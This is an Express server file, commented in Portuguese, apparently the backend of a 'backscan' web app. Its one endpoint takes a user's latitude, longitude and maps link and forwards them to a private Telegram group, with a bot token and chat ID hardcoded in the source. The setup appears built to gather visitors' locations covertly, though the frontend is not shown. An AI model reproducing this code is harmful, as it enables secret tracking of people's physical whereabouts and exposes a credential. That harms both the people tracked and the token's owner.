// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true); // Permite chamadas sem origin (ex: ferramentas locais)

    const allowedOrigins = [
      'https://backscan-frontend-ruby.vercel.app',
      'https://backscan-frontend-bmwxo6wgx-joses-projects-f591d517.vercel.app',
      'https://backscan-frontend-h7zz.vercel.app'
    ];

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));



app.use(bodyParser.json());

// NOVO: Habilitar respostas a OPTIONS
app.options('*', cors());
const TELEGRAM_BOT_TOKEN = "8073470836:AAHQGUBwutZfV-_i6r-yAE4kZFyGTU-eokA";
const TELEGRAM_CHAT_ID = "-4624260421"; // Seu grupo certo!

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});